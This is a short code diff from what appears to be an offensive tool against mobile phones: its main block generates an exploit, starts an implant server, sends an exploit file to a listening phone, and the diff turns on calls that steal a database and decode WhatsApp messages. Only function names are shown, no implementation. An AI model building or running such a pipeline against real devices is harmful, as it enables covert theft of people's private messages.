@@ -71,8 +71,7 @@ if __name__ == "__main__":
     gen_exploit.gen_exploit()
     start_implant_server()
     listen_for_phone_and_send_exploit_file()
-    # send_implant(host)
-    # steal_database()
-    # decode_whatsapp_messages()
+    steal_database()
+    decode_whatsapp_messages()
  
    
